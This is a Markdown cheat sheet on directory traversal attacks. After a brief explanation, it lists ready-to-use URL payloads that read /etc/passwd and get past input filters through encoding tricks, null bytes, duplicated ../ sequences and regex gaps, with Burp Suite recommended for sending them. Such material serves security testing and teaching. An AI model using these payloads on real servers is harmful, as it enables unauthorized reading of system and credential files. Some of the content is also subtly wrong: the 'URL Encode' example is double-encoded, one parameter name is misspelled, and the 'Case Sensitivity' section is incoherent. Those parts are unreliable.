# Directory Traversal

### Explanation
Directory traversal (also known as path traversal) is a vulnerability that occurs when an application allows a user to access files and directories beyond the intended directory. This vulnerability arises when user input is not properly sanitized, allowing attackers to manipulate file paths and access sensitive files or directories on the server.  

> [!NOTE]
> Its recommended the usage of Burp Suite to execute all the requests explained below. Using the repeater tool that facilitates the url encoding and response view.

### User input
The application takes user input, typically in the form of a file path or filename. Example: ```website.com/?filename=home.html```

### File Path Manipulation
An attacker manipulates the input by adding special characters or sequences such as "../" (dot-dot-slash) to traverse directories.  
Example:  
```website.com/?filename=../../../../../../../../../../../../../etc/passwd```  

### Accessing Sensitive Files
With the manipulated input, the attacker can access files and directories outside the intended scope, potentially gaining unauthorized access to sensitive information or system files.

### Avoiding string sanitation & security checks
#### Absolute path
There are times that you only need to request the absolute path to get the requested file:  
```website.com/?filename=/etc/passwd```

#### Non recursive replacement
Sometimes the security checks if the requested path contains ../ on the string without recursion. So to bypass this we need to duplicate the string like this:  
```website.com/?filename=....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd```  
As you can see we duplicated all the ```../``` strings.

#### URL Encode
If the system is blocking all the previous requests we can try to encode the url to bypass it:  
```website.com/?filename=..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd```

#### Double Encoding
In cases where the input is subjected to multiple rounds of decoding or filtering, double URL encoding the payload might evade detection. This involves encoding the special characters twice, making it harder for the filters to recognize and sanitize. Example:  

```website.com/?ilename=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd```  

#### Alternate Encodings
Apart from URL encoding, consider other character encodings such as UTF-8 or Unicode. By encoding the payload in different formats, you might bypass certain sanitization mechanisms that are designed to handle specific encodings. Example:  
```website.com/?filename=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd```  

#### Unicode Transformation
Transforming characters into their Unicode equivalents can sometimes bypass input filters. For instance, the dot character "." (U+002E) can be represented as "ï¼Ž" (U+FF0E) in full-width form, which might evade detection. Example:  
```website.com/?filename=..%ef%bc%8e%2f..%ef%bc%8e%2f..%ef%bc%8e%2fetc%ef%bc%8fpasswd```


#### Null Byte Injection
Some systems may perform string sanitation based on file extensions or known patterns. Null byte injection involves appending a null byte ("%00") to the end of the input string to terminate the string, effectively bypassing any subsequent checks. Example:  
```website.com/?filename=../../../../../../../../../../../etc/passwd%00```

#### Case Sensitivity
Exploit case sensitivity in file systems or URL handling mechanisms. For instance, if the system checks for "../" but not for "../", you could bypass the check by altering the case of the characters. Example:  
```website.com/?filename=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd```

#### File extension validation
Usually the url's that are requesting files are images using the imageName & extension (image1.png). A common security method used to prevent this requests is to check the file extension inside the requested url. We can bypass this using a null byte on the request:  
```website.com/?filename=../../../../../../../../../../../../../etc/passwd%00.jpg``` 

#### Regular Expression Bypass
If the application uses regular expressions to validate or sanitize input, understanding the patterns used can help you craft payloads that bypass these checks. Regular expressions can sometimes be complex and may not account for all possible edge cases. By carefully analyzing the regex pattern, you might identify weaknesses that can be exploited. Example:  
```website.com/?filename=../../..\/..\/..\/..\/..\/etc/passwd```